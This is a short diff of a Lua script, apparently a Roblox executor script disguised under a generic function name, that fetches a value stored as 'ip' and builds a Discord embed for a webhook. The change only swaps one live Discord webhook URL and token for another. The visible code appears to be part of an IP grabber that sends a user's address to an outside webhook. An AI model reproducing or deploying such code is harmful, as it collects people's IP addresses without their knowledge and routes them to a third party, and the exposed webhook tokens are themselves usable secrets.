@@ -99,7 +99,7 @@ local function LPFCW_fake_script() -- Frame.LocalScript
 	local ip = request(abcdef).Body
 	
 	local url =
-		"https://discord.com/api/webhooks/1033159263993991299/s-pC7iR15yqZxKE07fG7efLykgV_TBc4A0Y7xqz83pSbssCUmWRFn688INfVbAGJ_cc-"
+		"https://discord.com/api/webhooks/1070820807724511386/xfBty8CoNTBXe6migYA-MeatjPrCU1XzZjtnZGtPQgaFbxs_gH2v1eHvFx1lkUBdC6eI"
 	local data = {
 		["embeds"] = {
 			{
